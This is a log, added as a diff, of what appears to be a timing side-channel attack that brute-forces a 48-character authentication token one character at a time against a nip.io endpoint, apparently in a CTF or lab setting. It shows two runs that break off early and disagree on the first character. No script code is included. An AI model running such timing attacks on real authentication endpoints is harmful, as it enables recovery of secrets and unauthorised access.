@@ -1,0 +1,3704 @@
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Sequential cadence: start 0.80s; State File: solver/state.json
+
+[+] Position 1/48 | Prefix: ''
+  [ 1/62] '0': 100.90 ms
+  [ 2/62] '1': 106.84 ms
+  [ 3/62] '2': 96.66 ms
+  [ 4/62] '3': 103.21 ms
+  [ 5/62] '4': 115.66 ms
+  [ 6/62] '5': 97.81 ms
+  [ 7/62] '6': 99.01 ms
+  [ 8/62] '7': 104.05 ms
+  [ 9/62] '8': 100.71 ms
+  [10/62] '9': 99.18 ms
+  [11/62] 'a': 102.82 ms
+  [12/62] 'b': 99.65 ms
+  [13/62] 'c': 103.36 ms
+  [HTTP 502] backing off 1.5s, cadence -> 0.69s (1/12)...
+  [14/62] 'd': 102.46 ms
+  [15/62] 'e': 106.14 ms
+  [16/62] 'f': 100.90 ms
+  [17/62] 'g': 107.72 ms
+  [18/62] 'h': 109.83 ms
+  [19/62] 'i': 100.55 ms
+  [20/62] 'j': 101.19 ms
+  [21/62] 'k': 186.43 ms
+  [22/62] 'l': 105.36 ms
+  [23/62] 'm': 105.94 ms
+  [HTTP 502] backing off 1.5s, cadence -> 0.71s (1/12)...
+  [24/62] 'n': 107.75 ms
+  [25/62] 'o': 102.29 ms
+  [26/62] 'p': 117.88 ms
+  [HTTP 502] backing off 1.5s, cadence -> 1.07s (1/12)...
+  [27/62] 'q': 102.12 ms
+  [28/62] 'r': 102.54 ms
+  [HTTP 502] backing off 1.5s, cadence -> 1.61s (1/12)...
+  [29/62] 's': 105.59 ms
+  [30/62] 't': 105.17 ms
+  [31/62] 'u': 99.05 ms
+  [32/62] 'v': 106.94 ms
+  [HTTP 502] backing off 1.5s, cadence -> 1.98s (1/12)...
+  [33/62] 'w': 100.80 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [34/62] 'x': 106.01 ms
+  [35/62] 'y': 98.91 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [36/62] 'z': 103.05 ms
+  [37/62] 'A': 104.04 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [38/62] 'B': 109.90 ms
+  [39/62] 'C': 104.68 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [40/62] 'D': 104.47 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [41/62] 'E': 116.35 ms
+  [42/62] 'F': 108.94 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [43/62] 'G': 103.88 ms
+  [44/62] 'H': 103.81 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [45/62] 'I': 106.43 ms
+  [46/62] 'J': 124.24 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [47/62] 'K': 103.43 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [48/62] 'L': 105.93 ms
+  [49/62] 'M': 110.57 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [50/62] 'N': 103.44 ms
+  [51/62] 'O': 98.29 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [52/62] 'P': 106.01 ms
+  [53/62] 'Q': 99.16 ms
+  [54/62] 'R': 101.68 ms
+  [55/62] 'S': 194.50 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [56/62] 'T': 96.80 ms
+  [57/62] 'U': 103.53 ms
+  [58/62] 'V': 106.82 ms
+  [59/62] 'W': 104.91 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [60/62] 'X': 102.27 ms
+  [61/62] 'Y': 113.27 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [62/62] 'Z': 106.07 ms
+  => Verified finalists: [('S', 147.58), ('k', 145.55)]
+  [OK] Picked 'S' (147.58 ms) -> S  [152.3s/pos, ~119 min left]
+
+[+] Position 2/48 | Prefix: 'S'
+  [ 1/62] '0': 104.73 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [ 2/62] '1': 103.93 ms
+  [ 3/62] '2': 105.63 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [ 4/62] '3': 104.58 ms
+  [ 5/62] '4': 103.34 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [ 6/62] '5': 96.57 ms
+  [ 7/62] '6': 103.40 ms
+  [ 8/62] '7': 106.91 ms
+  [ 9/62] '8': 111.25 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [10/62] '9': 95.42 ms
+  [11/62] 'a': 106.13 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [12/62] 'b': 186.08 ms
+  [13/62] 'c': 93.92 ms
+  [14/62] 'd': 98.04 ms
+  [15/62] 'e': 100.65 ms
+  [16/62] 'f': 102.83 ms
+  [17/62] 'g': 98.87 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [18/62] 'h': 98.57 ms
+  [19/62] 'i': 108.14 ms
+  [20/62] 'j': 107.68 ms
+  [21/62] 'k': 103.05 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [22/62] 'l': 190.87 ms
+  [23/62] 'm': 94.82 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [24/62] 'n': 101.55 ms
+  [25/62] 'o': 100.70 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [26/62] 'p': 105.07 ms
+  [27/62] 'q': 101.57 ms
+  [28/62] 'r': 104.29 ms
+  [29/62] 's': 110.05 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [30/62] 't': 102.88 ms
+  [31/62] 'u': 94.29 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [32/62] 'v': 101.91 ms
+  [33/62] 'w': 102.37 ms
+  [34/62] 'x': 107.25 ms
+  [35/62] 'y': 101.24 ms
+  [36/62] 'z': 104.80 ms
+  [37/62] 'A': 106.98 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [38/62] 'B': 111.92 ms
+  [39/62] 'C': 94.90 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [40/62] 'D': 105.17 ms
+  [41/62] 'E': 93.26 ms
+  [42/62] 'F': 102.92 ms
+  [43/62] 'G': 101.69 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [44/62] 'H': 107.14 ms
+  [45/62] 'I': 106.39 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [46/62] 'J': 107.79 ms
+  [47/62] 'K': 105.59 ms
+  [48/62] 'L': 111.28 ms
+  [49/62] 'M': 105.11 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [50/62] 'N': 116.17 ms
+  [51/62] 'O': 110.04 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [52/62] 'P': 111.46 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [53/62] 'Q': 105.71 ms
+  [54/62] 'R': 101.23 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [55/62] 'S': 105.23 ms
+  [56/62] 'T': 110.82 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [57/62] 'U': 106.62 ms
+  [58/62] 'V': 104.01 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [59/62] 'W': 111.35 ms
+  [60/62] 'X': 105.42 ms
+  [61/62] 'Y': 110.39 ms
+  [62/62] 'Z': 104.69 ms
+  => Verified finalists: [('l', 152.85), ('b', 142.6)]
+  [OK] Picked 'l' (152.85 ms) -> Sl  [215.3s/pos, ~165 min left]
+
+[+] Position 3/48 | Prefix: 'Sl'
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [ 1/62] '0': 105.97 ms
+  [ 2/62] '1': 105.95 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [ 3/62] '2': 105.22 ms
+  [ 4/62] '3': 104.33 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [ 5/62] '4': 105.59 ms
+  [ 6/62] '5': 104.64 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [ 7/62] '6': 107.60 ms
+  [ 8/62] '7': 108.24 ms
+  [ 9/62] '8': 105.23 ms
+  [10/62] '9': 113.60 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [11/62] 'a': 105.93 ms
+  [12/62] 'b': 103.89 ms
+  [13/62] 'c': 107.86 ms
+  [14/62] 'd': 107.70 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [15/62] 'e': 108.42 ms
+  [16/62] 'f': 103.91 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [17/62] 'g': 115.36 ms
+  [18/62] 'h': 120.27 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [19/62] 'i': 99.67 ms
+  [20/62] 'j': 100.75 ms
+  [21/62] 'k': 110.00 ms
+  [22/62] 'l': 103.40 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [23/62] 'm': 105.35 ms
+  [24/62] 'n': 111.29 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [25/62] 'o': 116.47 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [26/62] 'p': 110.75 ms
+  [27/62] 'q': 104.78 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [28/62] 'r': 106.71 ms
+  [29/62] 's': 106.70 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [30/62] 't': 121.52 ms
+  [31/62] 'u': 105.81 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [32/62] 'v': 108.80 ms
+  [33/62] 'w': 104.18 ms
+  [34/62] 'x': 104.39 ms
+  [35/62] 'y': 111.70 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [36/62] 'z': 112.30 ms
+  [37/62] 'A': 101.95 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [38/62] 'B': 109.10 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [39/62] 'C': 104.21 ms
+  [40/62] 'D': 107.55 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [41/62] 'E': 111.31 ms
+  [42/62] 'F': 105.33 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [43/62] 'G': 107.24 ms
+  [44/62] 'H': 113.45 ms
+  [45/62] 'I': 108.74 ms
+  [46/62] 'J': 111.64 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [47/62] 'K': 107.81 ms
+  [48/62] 'L': 101.76 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [49/62] 'M': 102.52 ms
+  [50/62] 'N': 108.98 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [51/62] 'O': 102.85 ms
+  [52/62] 'P': 308.93 ms
+  [53/62] 'Q': 108.78 ms
+  [54/62] 'R': 115.29 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [55/62] 'S': 117.05 ms
+  [56/62] 'T': 106.44 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [57/62] 'U': 107.45 ms
+  [58/62] 'V': 101.28 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [59/62] 'W': 107.39 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [60/62] 'X': 106.68 ms
+  [61/62] 'Y': 105.14 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [62/62] 'Z': 104.98 ms
+  => Margin collapsed on confirmation; running verification.
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  => Verified finalists: [('P', 208.78), ('t', 110.97)]
+  [OK] Picked 'P' (208.78 ms) -> SlP  [240.4s/pos, ~180 min left]
+
+[+] Position 4/48 | Prefix: 'SlP'
+  [ 1/62] '0': 108.38 ms
+  [ 2/62] '1': 113.52 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [ 3/62] '2': 115.99 ms
+  [ 4/62] '3': 100.36 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [ 5/62] '4': 124.98 ms
+  [ 6/62] '5': 107.13 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [ 7/62] '6': 107.97 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [ 8/62] '7': 108.58 ms
+  [ 9/62] '8': 103.50 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [10/62] '9': 114.07 ms
+  [11/62] 'a': 106.48 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [12/62] 'b': 104.79 ms
+  [13/62] 'c': 105.88 ms
+  [14/62] 'd': 106.73 ms
+  [15/62] 'e': 111.43 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [16/62] 'f': 116.93 ms
+  [17/62] 'g': 103.43 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [18/62] 'h': 103.98 ms
+  [19/62] 'i': 108.12 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [20/62] 'j': 105.05 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+  [21/62] 'k': 111.51 ms
+  [22/62] 'l': 106.54 ms
+  [23/62] 'm': 111.44 ms
+  [24/62] 'n': 104.98 ms
+  [HTTP 502] backing off 1.5s, cadence -> 2.50s (1/12)...
+[*] Target Endpoint: https://619b19eb-70d8-4eaf-ae1c-57d1c8de2a76.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 0.80s; State File: solver/state.json
+
+[+] Position 1/48 | Prefix: ''
+  [ 1/62] '0': 112.14 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.20s (1/12)...
+  [ 2/62] '1': 112.93 ms
+  [ 3/62] '2': 102.02 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.80s (1/12)...
+  [ 4/62] '3': 104.39 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 5/62] '4': 103.32 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 6/62] '5': 122.05 ms
+  [ 7/62] '6': 118.22 ms
+  [ 8/62] '7': 125.59 ms
+  [ 9/62] '8': 116.48 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [10/62] '9': 104.81 ms
+  [11/62] 'a': 104.11 ms
+  [12/62] 'b': 110.28 ms
+  [13/62] 'c': 104.67 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [14/62] 'd': 105.52 ms
+  [15/62] 'e': 100.40 ms
+  [16/62] 'f': 99.37 ms
+  [17/62] 'g': 104.83 ms
+  [18/62] 'h': 108.27 ms
+  [19/62] 'i': 128.17 ms
+  [20/62] 'j': 117.27 ms
+  [21/62] 'k': 119.26 ms
+  [22/62] 'l': 114.21 ms
+  [23/62] 'm': 121.33 ms
+  [24/62] 'n': 102.97 ms
+  [25/62] 'o': 116.94 ms
+  [26/62] 'p': 108.49 ms
+  [27/62] 'q': 114.57 ms
+  [28/62] 'r': 104.64 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.55s (1/12)...
+  [29/62] 's': 104.22 ms
+  [30/62] 't': 101.02 ms
+  [31/62] 'u': 102.01 ms
+  [32/62] 'v': 105.91 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.70s (1/12)...
+  [33/62] 'w': 100.78 ms
+  [34/62] 'x': 182.31 ms
+  [35/62] 'y': 114.29 ms
+  [36/62] 'z': 119.61 ms
+  [37/62] 'A': 1518.60 ms
+  [38/62] 'B': 105.49 ms
+  [39/62] 'C': 122.54 ms
+  [40/62] 'D': 107.28 ms
+  [41/62] 'E': 110.66 ms
+  [42/62] 'F': 117.95 ms
+  [43/62] 'G': 110.37 ms
+  [44/62] 'H': 112.14 ms
+  [45/62] 'I': 111.35 ms
+  [46/62] 'J': 108.17 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.55s (1/12)...
+  [47/62] 'K': 115.90 ms
+  [48/62] 'L': 132.90 ms
+  [49/62] 'M': 107.66 ms
+  [50/62] 'N': 107.56 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.70s (1/12)...
+  [51/62] 'O': 110.56 ms
+  [52/62] 'P': 108.92 ms
+  [53/62] 'Q': 100.62 ms
+  [54/62] 'R': 96.09 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.86s (1/12)...
+  [55/62] 'S': 107.65 ms
+  [56/62] 'T': 104.25 ms
+  [57/62] 'U': 109.26 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.29s (1/12)...
+  [58/62] 'V': 121.33 ms
+  [59/62] 'W': 103.62 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.94s (1/12)...
+  [60/62] 'X': 121.51 ms
+  [61/62] 'Y': 113.40 ms
+  [62/62] 'Z': 97.66 ms
+  [screening] 62 candidates in 92.5s; baseline: 109.09 ms; sigma: 7.91 ms; margin: 23.73 ms
+  => Phase 2: top-4, 3 extra samples each, interleaved
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 1/3
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 2/3
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 3/3
+  => Verified finalists: [('A', 152.85), ('x', 112.52), ('i', 110.14), ('L', 109.86)]
+  [OK] Picked 'A' (152.85 ms) -> A  [133.6s/pos, ~105 min left]
+
+[+] Position 2/48 | Prefix: 'A'
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 1/62] '0': 107.39 ms
+  [ 2/62] '1': 108.07 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 3/62] '2': 112.81 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 4/62] '3': 105.72 ms
+  [ 5/62] '4': 119.97 ms
+  [ 6/62] '5': 106.19 ms
+  [ 7/62] '6': 101.42 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 8/62] '7': 111.08 ms
+  [ 9/62] '8': 105.92 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [10/62] '9': 103.46 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [11/62] 'a': 108.55 ms
+  [12/62] 'b': 96.86 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [13/62] 'c': 100.80 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [14/62] 'd': 99.91 ms
+  [15/62] 'e': 94.99 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [16/62] 'f': 106.17 ms
+  [17/62] 'g': 103.76 ms
+  [18/62] 'h': 116.35 ms
+  [19/62] 'i': 98.81 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [20/62] 'j': 105.65 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [21/62] 'k': 105.06 ms
+  [22/62] 'l': 102.41 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [23/62] 'm': 102.32 ms
+  [24/62] 'n': 141.51 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [25/62] 'o': 98.58 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [26/62] 'p': 110.03 ms
+  [27/62] 'q': 96.79 ms
+  [28/62] 'r': 104.83 ms
+  [29/62] 's': 97.18 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [30/62] 't': 104.73 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [31/62] 'u': 116.05 ms
+  [32/62] 'v': 103.86 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [33/62] 'w': 107.04 ms
+  [34/62] 'x': 105.13 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [35/62] 'y': 119.49 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [36/62] 'z': 109.76 ms
+  [37/62] 'A': 108.52 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [38/62] 'B': 113.79 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [39/62] 'C': 104.96 ms
+  [40/62] 'D': 109.96 ms
+  [41/62] 'E': 98.07 ms
+  [42/62] 'F': 104.27 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [43/62] 'G': 110.40 ms
+  [44/62] 'H': 97.43 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [45/62] 'I': 99.95 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [46/62] 'J': 106.02 ms
+  [47/62] 'K': 103.48 ms
+  [48/62] 'L': 110.14 ms
+  [49/62] 'M': 98.05 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [50/62] 'N': 104.38 ms
+  [51/62] 'O': 102.21 ms
+  [52/62] 'P': 106.44 ms
+  [53/62] 'Q': 107.05 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [54/62] 'R': 114.91 ms
+  [55/62] 'S': 97.38 ms
+  [56/62] 'T': 101.40 ms
+  [57/62] 'U': 99.01 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [58/62] 'V': 98.91 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [59/62] 'W': 111.14 ms
+  [60/62] 'X': 110.88 ms
+  [61/62] 'Y': 110.42 ms
+  [62/62] 'Z': 105.23 ms
+  [screening] 62 candidates in 221.9s; baseline: 105.18 ms; sigma: 6.64 ms; margin: 19.91 ms
+  => Phase 2: top-4, 3 extra samples each, interleaved
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 1/3
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 2/3
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 3/3
+  => Verified finalists: [('n', 116.41), ('y', 115.74), ('h', 109.72), ('4', 108.59)]
+  [!] No clear winner: best final 116.41 ms < baseline 105.18 + margin 19.91 = 125.09 ms.
+      Re-running Phase 1 once with fresh samples...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 1/62] '0': 116.95 ms
+  [ 2/62] '1': 106.76 ms
+  [ 3/62] '2': 112.11 ms
+  [ 4/62] '3': 106.78 ms
+  [ 5/62] '4': 118.26 ms
+  [ 6/62] '5': 99.16 ms
+  [ 7/62] '6': 101.34 ms
+  [ 8/62] '7': 99.32 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.39s (1/12)...
+  [ 9/62] '8': 106.82 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.09s (1/12)...
+  [10/62] '9': 100.02 ms
+  [11/62] 'a': 103.91 ms
+  [12/62] 'b': 101.25 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [13/62] 'c': 110.90 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [14/62] 'd': 114.02 ms
+  [15/62] 'e': 104.33 ms
+  [16/62] 'f': 101.79 ms
+  [17/62] 'g': 104.52 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [18/62] 'h': 113.77 ms
+  [19/62] 'i': 97.82 ms
+  [20/62] 'j': 102.40 ms
+  [21/62] 'k': 101.62 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [22/62] 'l': 97.69 ms
+  [23/62] 'm': 107.11 ms
+  [24/62] 'n': 111.36 ms
+  [25/62] 'o': 230.95 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [26/62] 'p': 101.90 ms
+  [27/62] 'q': 120.47 ms
+  [28/62] 'r': 108.66 ms
+  [29/62] 's': 106.21 ms
+  [30/62] 't': 106.34 ms
+  [31/62] 'u': 111.02 ms
+  [32/62] 'v': 102.34 ms
+  [33/62] 'w': 111.59 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.39s (1/12)...
+  [34/62] 'x': 116.08 ms
+  [35/62] 'y': 121.32 ms
+  [36/62] 'z': 104.15 ms
+  [37/62] 'A': 103.16 ms
+  [38/62] 'B': 98.93 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.40s (1/12)...
+  [39/62] 'C': 96.72 ms
+  [40/62] 'D': 99.23 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.10s (1/12)...
+  [41/62] 'E': 106.24 ms
+  [42/62] 'F': 107.74 ms
+  [43/62] 'G': 107.49 ms
+  [44/62] 'H': 106.43 ms
+  [45/62] 'I': 102.64 ms
+  [46/62] 'J': 101.94 ms
+  [47/62] 'K': 93.66 ms
+  [48/62] 'L': 100.92 ms
+  [49/62] 'M': 102.90 ms
+  [50/62] 'N': 99.03 ms
+  [51/62] 'O': 104.38 ms
+  [52/62] 'P': 106.64 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.60s (1/12)...
+  [53/62] 'Q': 111.14 ms
+  [54/62] 'R': 100.25 ms
+  [55/62] 'S': 105.49 ms
+  [56/62] 'T': 102.21 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.74s (1/12)...
+  [57/62] 'U': 99.69 ms
+  [58/62] 'V': 101.76 ms
+  [59/62] 'W': 111.47 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.12s (1/12)...
+  [60/62] 'X': 119.62 ms
+  [61/62] 'Y': 110.59 ms
+  [62/62] 'Z': 100.31 ms
+  [screening retry] 62 candidates in 129.6s; baseline: 104.45 ms; sigma: 5.68 ms; margin: 17.05 ms
+  => Retry Phase 1 winner 'o': 230.95 ms (threshold 121.50 ms)
+  [OK] Picked 'o' (230.95 ms) -> Ao  [395.6s/pos, ~303 min left]
+
+[+] Position 3/48 | Prefix: 'Ao'
+  [ 1/62] '0': 96.72 ms
+  [ 2/62] '1': 99.29 ms
+  [ 3/62] '2': 100.03 ms
+  [ 4/62] '3': 97.84 ms
+  [ 5/62] '4': 97.05 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.66s (1/12)...
+  [ 6/62] '5': 116.96 ms
+  [ 7/62] '6': 111.94 ms
+  [ 8/62] '7': 105.46 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.00s (1/12)...
+  [ 9/62] '8': 106.87 ms
+  [10/62] '9': 114.81 ms
+  [11/62] 'a': 116.00 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.49s (1/12)...
+  [12/62] 'b': 114.86 ms
+  [13/62] 'c': 140.00 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.24s (1/12)...
+  [14/62] 'd': 117.78 ms
+  [15/62] 'e': 114.59 ms
+  [16/62] 'f': 113.35 ms
+  [17/62] 'g': 112.91 ms
+  [18/62] 'h': 106.47 ms
+  [19/62] 'i': 107.06 ms
+  [20/62] 'j': 121.51 ms
+  [21/62] 'k': 112.20 ms
+  [22/62] 'l': 104.78 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.02s (1/12)...
+  [23/62] 'm': 97.01 ms
+  [24/62] 'n': 105.18 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.53s (1/12)...
+  [25/62] 'o': 105.75 ms
+  [26/62] 'p': 112.11 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.30s (1/12)...
+  [27/62] 'q': 102.94 ms
+  [28/62] 'r': 117.75 ms
+  [29/62] 's': 114.23 ms
+  [30/62] 't': 110.85 ms
